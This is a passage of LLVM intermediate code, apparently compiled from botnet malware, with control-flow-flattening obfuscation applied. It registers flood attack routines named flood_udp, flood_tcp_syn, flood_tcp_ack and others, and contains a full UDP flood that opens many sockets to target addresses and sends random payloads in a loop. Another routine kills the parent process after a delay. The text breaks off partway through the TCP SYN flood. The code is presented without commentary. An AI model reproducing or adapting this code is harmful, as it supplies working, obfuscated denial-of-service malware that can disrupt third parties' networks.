  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 -1, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %5 = load %struct.arguments*, %struct.arguments** %2, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %5, i32 0, i32 4
  %7 = load i16, i16* %6, align 2
  %8 = zext i16 %7 to i32
  %9 = call i32 @sleep(i32 %8)
  %10 = call i32 @getppid() #8
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  store i32 %11, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -168971794, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -168971794, label %first
    i32 -687404914, label %14
    i32 -1270006099, label %17
    i32 664037784, label %23
    i32 138454792, label %28
    i32 -1099605527, label %34
    i32 136248756, label %35
    i32 1944421145, label %36
    i32 714375471, label %44
    i32 945860733, label %53
    i32 1141062696, label %56
    i32 -1246065806, label %61
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %12 = icmp sgt i32 %.reload, 1
  %13 = select i1 %12, i32 -687404914, i32 -1270006099
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #8
  store i32 -1270006099, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.arguments*, %struct.arguments** %2, align 8
  %19 = getelementptr inbounds %struct.arguments, %struct.arguments* %18, i32 0, i32 0
  %20 = load %struct.target*, %struct.target** %19, align 8
  %21 = icmp ne %struct.target* %20, null
  %22 = select i1 %21, i32 664037784, i32 138454792
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.arguments*, %struct.arguments** %2, align 8
  %25 = getelementptr inbounds %struct.arguments, %struct.arguments* %24, i32 0, i32 0
  %26 = load %struct.target*, %struct.target** %25, align 8
  %27 = bitcast %struct.target* %26 to i8*
  call void @free(i8* %27) #8
  store i32 138454792, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load %struct.arguments*, %struct.arguments** %2, align 8
  %30 = getelementptr inbounds %struct.arguments, %struct.arguments* %29, i32 0, i32 1
  %31 = load %struct.option*, %struct.option** %30, align 8
  %32 = icmp ne %struct.option* %31, null
  %33 = select i1 %32, i32 136248756, i32 -1099605527
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  call void @exit(i32 0) #10
  unreachable

; <label>:35:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1944421145, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 2
  %40 = load i8, i8* %39, align 8
  %41 = zext i8 %40 to i32
  %42 = icmp slt i32 %37, %41
  %43 = select i1 %42, i32 714375471, i32 1141062696
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.option, %struct.option* %47, i64 %49
  %51 = getelementptr inbounds %struct.option, %struct.option* %50, i32 0, i32 2
  %52 = load i8*, i8** %51, align 8
  call void @free(i8* %52) #8
  store i32 945860733, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %4, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %4, align 4
  store i32 1944421145, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load %struct.arguments*, %struct.arguments** %2, align 8
  %58 = getelementptr inbounds %struct.arguments, %struct.arguments* %57, i32 0, i32 1
  %59 = load %struct.option*, %struct.option** %58, align 8
  %60 = bitcast %struct.option* %59 to i8*
  call void @free(i8* %60) #8
  call void @exit(i32 0) #10
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %53, %44, %36, %35, %28, %23, %17, %14, %first, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #6

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @init_commands() #0 {
  call void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  call void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  call void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  call void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  call void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @load_command(i8 zeroext, i8* (...)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i8* (...)*, align 8
  store i8 %0, i8* %3, align 1
  store i8* (...)* %1, i8* (...)** %4, align 8
  %5 = load i8, i8* %3, align 1
  %6 = load i8, i8* %3, align 1
  %7 = zext i8 %6 to i64
  %8 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %7
  %9 = getelementptr inbounds %struct.command, %struct.command* %8, i32 0, i32 0
  store i8 %5, i8* %9, align 16
  %10 = load i8* (...)*, i8* (...)** %4, align 8
  %11 = load i8, i8* %3, align 1
  %12 = zext i8 %11 to i64
  %13 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %12
  %14 = getelementptr inbounds %struct.command, %struct.command* %13, i32 0, i32 1
  store i8* (...)* %10, i8* (...)** %14, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udp(%struct.arguments*) #0 {
  %.reg2mem = alloca i8**
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %12 = load %struct.arguments*, %struct.arguments** %2, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %12, i32 0, i32 1
  %14 = load %struct.option*, %struct.option** %13, align 8
  %15 = load %struct.arguments*, %struct.arguments** %2, align 8
  %16 = getelementptr inbounds %struct.arguments, %struct.arguments* %15, i32 0, i32 2
  %17 = load i8, i8* %16, align 8
  %18 = call zeroext i16 @retrieve_opt_num(%struct.option* %14, i8 zeroext %17, i8 zeroext 2, i16 zeroext 900)
  store i16 %18, i16* %3, align 2
  %19 = load %struct.arguments*, %struct.arguments** %2, align 8
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %19, i32 0, i32 1
  %21 = load %struct.option*, %struct.option** %20, align 8
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 2
  %24 = load i8, i8* %23, align 8
  %25 = call zeroext i16 @retrieve_opt_num(%struct.option* %21, i8 zeroext %24, i8 zeroext 1, i16 zeroext -1)
  store i16 %25, i16* %4, align 2
  %26 = load %struct.arguments*, %struct.arguments** %2, align 8
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %26, i32 0, i32 3
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #8
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %6, align 8
  %32 = load i8**, i8*** %6, align 8
  store i8** %32, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 -459143085, i32* %switchVar
  %.reg2mem2 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -459143085, label %first
    i32 1512660948, label %35
    i32 -1542640281, label %36
    i32 1537036969, label %46
    i32 -515840119, label %47
    i32 -2014892389, label %48
    i32 -1141664643, label %56
    i32 1789659455, label %69
    i32 1556234151, label %70
    i32 -1241344764, label %87
    i32 1609080326, label %88
    i32 -900480447, label %120
    i32 854282315, label %143
    i32 -696335213, label %152
    i32 1881274011, label %172
    i32 -562312003, label %175
    i32 1904829893, label %176
    i32 1079520076, label %177
    i32 -1358705674, label %185
    i32 62121196, label %199
    i32 1395564268, label %202
    i32 1214678359, label %203
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %33 = icmp ne i8** %.reload, null
  %34 = select i1 %33, i32 -1542640281, i32 1512660948
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:36:                                     ; preds = %loopEntry
  %37 = load %struct.arguments*, %struct.arguments** %2, align 8
  %38 = getelementptr inbounds %struct.arguments, %struct.arguments* %37, i32 0, i32 3
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i64
  %41 = call noalias i8* @calloc(i64 %40, i64 4) #8
  %42 = bitcast i8* %41 to i32*
  store i32* %42, i32** %7, align 8
  %43 = load i32*, i32** %7, align 8
  %44 = icmp ne i32* %43, null
  %45 = select i1 %44, i32 -515840119, i32 1537036969
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:47:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -2014892389, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %5, align 4
  %50 = load %struct.arguments*, %struct.arguments** %2, align 8
  %51 = getelementptr inbounds %struct.arguments, %struct.arguments* %50, i32 0, i32 3
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp slt i32 %49, %53
  %55 = select i1 %54, i32 -1141664643, i32 -562312003
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %58 = load i32*, i32** %7, align 8
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i32, i32* %58, i64 %60
  store i32 %57, i32* %61, align 4
  %62 = load i32*, i32** %7, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = icmp eq i32 %66, -1
  %68 = select i1 %67, i32 1789659455, i32 1556234151
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i16, i16* %3, align 2
  %72 = zext i16 %71 to i32
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  %75 = call noalias i8* @malloc(i64 %74) #8
  %76 = load i8**, i8*** %6, align 8
  %77 = load i32, i32* %5, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  store i8* %75, i8** %79, align 8
  %80 = load i8**, i8*** %6, align 8
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8*, i8** %80, i64 %82
  %84 = load i8*, i8** %83, align 8
  %85 = icmp ne i8* %84, null
  %86 = select i1 %85, i32 1609080326, i32 -1241344764
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  call void @exit(i32 1) #10
  unreachable

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %89, align 4
  %90 = call i32 @rand_new()
  %91 = trunc i32 %90 to i16
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %91, i16* %92, align 2
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %94 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %93, i32 0, i32 0
  store i32 0, i32* %94, align 4
  %95 = load i32*, i32** %7, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %95, i64 %97
  %99 = load i32, i32* %98, align 4
  %100 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %101 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %101, %struct.sockaddr** %100, align 8
  %102 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %103 = load %struct.sockaddr*, %struct.sockaddr** %102, align 8
  %104 = call i32 @bind(i32 %99, %struct.sockaddr* %103, i32 16) #8
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %105, align 4
  %106 = load i16, i16* %4, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %106) #9
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  %109 = load %struct.arguments*, %struct.arguments** %2, align 8
  %110 = getelementptr inbounds %struct.arguments, %struct.arguments* %109, i32 0, i32 0
  %111 = load %struct.target*, %struct.target** %110, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.target, %struct.target* %111, i64 %113
  %115 = getelementptr inbounds %struct.target, %struct.target* %114, i32 0, i32 1
  %116 = load i16, i16* %115, align 4
  %117 = zext i16 %116 to i32
  %118 = icmp slt i32 %117, 32
  %119 = select i1 %118, i32 -900480447, i32 854282315
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load %struct.arguments*, %struct.arguments** %2, align 8
  %122 = getelementptr inbounds %struct.arguments, %struct.arguments* %121, i32 0, i32 0
  %123 = load %struct.target*, %struct.target** %122, align 8
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.target, %struct.target* %123, i64 %125
  %127 = getelementptr inbounds %struct.target, %struct.target* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 4
  %129 = call i32 @ntohl(i32 %128) #9
  %130 = call i32 @rand_new()
  %131 = load %struct.arguments*, %struct.arguments** %2, align 8
  %132 = getelementptr inbounds %struct.arguments, %struct.arguments* %131, i32 0, i32 0
  %133 = load %struct.target*, %struct.target** %132, align 8
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.target, %struct.target* %133, i64 %135
  %137 = getelementptr inbounds %struct.target, %struct.target* %136, i32 0, i32 1
  %138 = load i16, i16* %137, align 4
  %139 = zext i16 %138 to i32
  %140 = lshr i32 %130, %139
  %141 = add i32 %129, %140
  %142 = call i32 @htonl(i32 %141) #9
  store i32 -696335213, i32* %switchVar
  store i32 %142, i32* %.reg2mem2
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.arguments*, %struct.arguments** %2, align 8
  %145 = getelementptr inbounds %struct.arguments, %struct.arguments* %144, i32 0, i32 0
  %146 = load %struct.target*, %struct.target** %145, align 8
  %147 = load i32, i32* %5, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.target, %struct.target* %146, i64 %148
  %150 = getelementptr inbounds %struct.target, %struct.target* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  store i32 -696335213, i32* %switchVar
  store i32 %151, i32* %.reg2mem2
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %.reload3, i32* %154, align 4
  %155 = load i32*, i32** %7, align 8
  %156 = load i32, i32* %5, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %161 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %161, %struct.sockaddr** %160, align 8
  %162 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %163 = load %struct.sockaddr*, %struct.sockaddr** %162, align 8
  %164 = call i32 @connect(i32 %159, %struct.sockaddr* %163, i32 16)
  %165 = load i8**, i8*** %6, align 8
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8*, i8** %165, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = load i16, i16* %3, align 2
  %171 = zext i16 %170 to i32
  call void @rand_string(i8* %169, i32 %171)
  store i32 1881274011, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %5, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %5, align 4
  store i32 -2014892389, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1904829893, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1079520076, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %5, align 4
  %179 = load %struct.arguments*, %struct.arguments** %2, align 8
  %180 = getelementptr inbounds %struct.arguments, %struct.arguments* %179, i32 0, i32 3
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp slt i32 %178, %182
  %184 = select i1 %183, i32 -1358705674, i32 1395564268
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32*, i32** %7, align 8
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i32, i32* %186, i64 %188
  %190 = load i32, i32* %189, align 4
  %191 = load i8**, i8*** %6, align 8
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds i8*, i8** %191, i64 %193
  %195 = load i8*, i8** %194, align 8
  %196 = load i16, i16* %3, align 2
  %197 = zext i16 %196 to i64
  %198 = call i64 @send(i32 %190, i8* %195, i64 %197, i32 16384)
  store i32 62121196, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load i32, i32* %5, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %5, align 4
  store i32 1079520076, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 1904829893, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %202, %199, %185, %177, %176, %175, %172, %152, %143, %120, %88, %70, %56, %48, %47, %36, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #6

declare i64 @send(i32, i8*, i64, i32) #6

; Function Attrs: noinline nounwind uwtable
define void @flood_tcp_syn(%struct.arguments*) #0 {
  %.reg2mem = alloca i8**
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca i16, align 2
  %7 = alloca i8, align 1
  %8 = alloca i16, align 2
  %9 = alloca i8**, align 8
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.tcphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i16 0, i16* %5, align 2
  store i16 0, i16* %6, align 2
  store i8 0, i8* %7, align 1
  store i16 0, i16* %8, align 2
  store i8 0, i8* %10, align 1
  store i8 0, i8* %11, align 1
  store i8 0, i8* %12, align 1
  store i8 0, i8* %13, align 1
  store i8 0, i8* %14, align 1
  store i8 0, i8* %15, align 1
  store i8 0, i8* %16, align 1
  store i16 0, i16* %17, align 2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  store i32 0, i32* %23, align 4
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 2, i16 zeroext 900)
  store i16 %37, i16* %5, align 2
  %38 = load %struct.arguments*, %struct.arguments** %2, align 8
  %39 = getelementptr inbounds %struct.arguments, %struct.arguments* %38, i32 0, i32 1
  %40 = load %struct.option*, %struct.option** %39, align 8
  %41 = load %struct.arguments*, %struct.arguments** %2, align 8
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 8
  %44 = call zeroext i16 @retrieve_opt_num(%struct.option* %40, i8 zeroext %43, i8 zeroext 1, i16 zeroext -1)
  store i16 %44, i16* %6, align 2
  %45 = load %struct.arguments*, %struct.arguments** %2, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %45, i32 0, i32 1
  %47 = load %struct.option*, %struct.option** %46, align 8
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 2
  %50 = load i8, i8* %49, align 8
  %51 = call zeroext i16 @retrieve_opt_num(%struct.option* %47, i8 zeroext %50, i8 zeroext 7, i16 zeroext 255)
  %52 = trunc i16 %51 to i8
  store i8 %52, i8* %7, align 1
  %53 = load %struct.arguments*, %struct.arguments** %2, align 8
  %54 = getelementptr inbounds %struct.arguments, %struct.arguments* %53, i32 0, i32 1
  %55 = load %struct.option*, %struct.option** %54, align 8
  %56 = load %struct.arguments*, %struct.arguments** %2, align 8
  %57 = getelementptr inbounds %struct.arguments, %struct.arguments* %56, i32 0, i32 2
  %58 = load i8, i8* %57, align 8
  %59 = call zeroext i16 @retrieve_opt_num(%struct.option* %55, i8 zeroext %58, i8 zeroext 8, i16 zeroext -1)
  store i16 %59, i16* %8, align 2
  %60 = load %struct.arguments*, %struct.arguments** %2, align 8
  %61 = getelementptr inbounds %struct.arguments, %struct.arguments* %60, i32 0, i32 1
  %62 = load %struct.option*, %struct.option** %61, align 8
  %63 = load %struct.arguments*, %struct.arguments** %2, align 8
  %64 = getelementptr inbounds %struct.arguments, %struct.arguments* %63, i32 0, i32 2
  %65 = load i8, i8* %64, align 8
  %66 = call zeroext i16 @retrieve_opt_num(%struct.option* %62, i8 zeroext %65, i8 zeroext 9, i16 zeroext 0)
  %67 = trunc i16 %66 to i8
  store i8 %67, i8* %10, align 1
  %68 = load %struct.arguments*, %struct.arguments** %2, align 8
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %68, i32 0, i32 1
  %70 = load %struct.option*, %struct.option** %69, align 8
  %71 = load %struct.arguments*, %struct.arguments** %2, align 8
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = call zeroext i16 @retrieve_opt_num(%struct.option* %70, i8 zeroext %73, i8 zeroext 10, i16 zeroext 0)
  %75 = trunc i16 %74 to i8
  store i8 %75, i8* %11, align 1
  %76 = load %struct.arguments*, %struct.arguments** %2, align 8
  %77 = getelementptr inbounds %struct.arguments, %struct.arguments* %76, i32 0, i32 1
  %78 = load %struct.option*, %struct.option** %77, align 8
  %79 = load %struct.arguments*, %struct.arguments** %2, align 8
  %80 = getelementptr inbounds %struct.arguments, %struct.arguments* %79, i32 0, i32 2
  %81 = load i8, i8* %80, align 8
  %82 = call zeroext i16 @retrieve_opt_num(%struct.option* %78, i8 zeroext %81, i8 zeroext 11, i16 zeroext 0)
  %83 = trunc i16 %82 to i8
  store i8 %83, i8* %12, align 1
  %84 = load %struct.arguments*, %struct.arguments** %2, align 8
  %85 = getelementptr inbounds %struct.arguments, %struct.arguments* %84, i32 0, i32 1
  %86 = load %struct.option*, %struct.option** %85, align 8
  %87 = load %struct.arguments*, %struct.arguments** %2, align 8
  %88 = getelementptr inbounds %struct.arguments, %struct.arguments* %87, i32 0, i32 2
  %89 = load i8, i8* %88, align 8
  %90 = call zeroext i16 @retrieve_opt_num(%struct.option* %86, i8 zeroext %89, i8 zeroext 12, i16 zeroext 0)
  %91 = trunc i16 %90 to i8
  store i8 %91, i8* %13, align 1
  %92 = load %struct.arguments*, %struct.arguments** %2, align 8
  %93 = getelementptr inbounds %struct.arguments, %struct.arguments* %92, i32 0, i32 1
  %94 = load %struct.option*, %struct.option** %93, align 8
  %95 = load %struct.arguments*, %struct.arguments** %2, align 8
  %96 = getelementptr inbounds %struct.arguments, %struct.arguments* %95, i32 0, i32 2
  %97 = load i8, i8* %96, align 8
  %98 = call zeroext i16 @retrieve_opt_num(%struct.option* %94, i8 zeroext %97, i8 zeroext 13, i16 zeroext 0)
  %99 = trunc i16 %98 to i8
  store i8 %99, i8* %14, align 1
  %100 = load %struct.arguments*, %struct.arguments** %2, align 8
  %101 = getelementptr inbounds %struct.arguments, %struct.arguments* %100, i32 0, i32 1
  %102 = load %struct.option*, %struct.option** %101, align 8
  %103 = load %struct.arguments*, %struct.arguments** %2, align 8
  %104 = getelementptr inbounds %struct.arguments, %struct.arguments* %103, i32 0, i32 2
  %105 = load i8, i8* %104, align 8
  %106 = call zeroext i16 @retrieve_opt_num(%struct.option* %102, i8 zeroext %105, i8 zeroext 14, i16 zeroext 1)
  %107 = trunc i16 %106 to i8
  store i8 %107, i8* %15, align 1
  %108 = load %struct.arguments*, %struct.arguments** %2, align 8
  %109 = getelementptr inbounds %struct.arguments, %struct.arguments* %108, i32 0, i32 1
  %110 = load %struct.option*, %struct.option** %109, align 8
  %111 = load %struct.arguments*, %struct.arguments** %2, align 8
  %112 = getelementptr inbounds %struct.arguments, %struct.arguments* %111, i32 0, i32 2
  %113 = load i8, i8* %112, align 8
  %114 = call zeroext i16 @retrieve_opt_num(%struct.option* %110, i8 zeroext %113, i8 zeroext 15, i16 zeroext 0)
  %115 = trunc i16 %114 to i8
  store i8 %115, i8* %16, align 1
  %116 = load %struct.arguments*, %struct.arguments** %2, align 8
  %117 = getelementptr inbounds %struct.arguments, %struct.arguments* %116, i32 0, i32 1
  %118 = load %struct.option*, %struct.option** %117, align 8
  %119 = load %struct.arguments*, %struct.arguments** %2, align 8
  %120 = getelementptr inbounds %struct.arguments, %struct.arguments* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = call zeroext i16 @retrieve_opt_num(%struct.option* %118, i8 zeroext %121, i8 zeroext 16, i16 zeroext -1)
  store i16 %122, i16* %17, align 2
  %123 = load %struct.arguments*, %struct.arguments** %2, align 8
  %124 = getelementptr inbounds %struct.arguments, %struct.arguments* %123, i32 0, i32 1
  %125 = load %struct.option*, %struct.option** %124, align 8
  %126 = load %struct.arguments*, %struct.arguments** %2, align 8
